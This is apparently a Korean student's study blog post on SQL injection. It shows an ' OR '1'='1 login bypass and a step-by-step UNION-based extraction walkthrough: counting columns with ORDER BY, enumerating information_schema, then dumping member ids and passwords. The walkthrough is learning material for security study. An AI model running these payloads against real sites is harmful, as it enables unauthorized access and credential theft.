---
title: "Week 6 - Union Injection"
date: 2025-05-17
categories: [study]
layout: single
author_profile: true
sidebar:
  nav: "main"
read_time: true
toc: true
toc_label: "On this page"
toc_sticky: true
---

# 1. SQL Injection: 인증 우회 및 데이터 추출

SQL Injection은 웹 애플리케이션에서 사용자 입력값이 안전하게 처리되지 않을 때 발생하는 취약점입니다. 이 포스트에서는 인증 우회를 포함한 SQL Injection을 통해 **데이터를 추출하는 절차**를 정리합니다.

## 1.1 SQL Injection의 목적

보통 SQL Injection은 다음 두 가지 목적으로 활용됩니다:

- **인증 우회**: 로그인 등의 인증 시스템을 무력화
- **데이터 추출**: 데이터베이스에 저장된 민감한 정보를 외부로 노출

---

# 2. 인증 우회 예시

로그인 로직이 다음과 같이 구현되어 있다고 가정합니다:

```sql
SELECT * FROM user WHERE id = 'doldol' AND pass = '';
이때 다음과 같은 입력을 하면 항상 참이 되어 인증이 우회됩니다:

sql
복사
편집
' OR '1'='1
최종 쿼리:

sql
복사
편집
SELECT * FROM user WHERE id = 'doldol' AND pass = '' OR '1'='1';
3. 데이터 추출이 가능한 조건
데이터를 추출하기 위해선 다음 두 조건 중 하나를 만족해야 합니다:

조건	예시
웹페이지에 데이터가 출력된다	게시판, 검색결과 등
웹페이지에 데이터가 출력되지 않는다	로그인, 아이디 중복체크 등

이번 포스트에선 화면에 데이터가 출력되는 경우를 중심으로 설명합니다.

4. UNION을 이용한 SQL Injection
UNION 키워드를 이용하면 두 개 이상의 SELECT 결과를 합쳐서 출력할 수 있습니다.

예시:

sql
복사
편집
SELECT pass FROM member
UNION
SELECT id FROM member;
또는:

sql
복사
편집
SELECT id, pass FROM member
UNION
SELECT 'normaltic', 'test';
❗ 주의: UNION을 사용할 때는 앞뒤 SELECT문의 컬럼 개수가 같아야 합니다.

5. SQL Injection 단계별 분석
1단계. Injection 포인트 확인
사용자 입력값이 SQL 쿼리에 반영되고 있는지 확인

페이지 출력 결과를 통해 추측

2단계. 컬럼 개수 찾기
sql
복사
편집
' ORDER BY 1 #
' ORDER BY 2 #
' ORDER BY 3 #
...
오류가 발생하지 않는 최대 인덱스를 통해 컬럼 수 추정 (예: 4개)

3단계. 출력 컬럼 위치 찾기
sql
복사
편집
' UNION SELECT 1,2,3,4 #
어느 숫자가 실제 웹페이지에 출력되는지 확인

출력되는 위치에 민감 정보 삽입 가능

4단계. 현재 DB 이름 확인
sql
복사
편집
' UNION SELECT 1, database(), 3, 4 #
5단계. 테이블 이름 확인
sql
복사
편집
' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema = 'DB이름' #
6단계. 컬럼 이름 확인
sql
복사
편집
' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name = '테이블이름' #
7단계. 데이터 추출
sql
복사
편집
' UNION SELECT 1, id, pass, 4 FROM member #
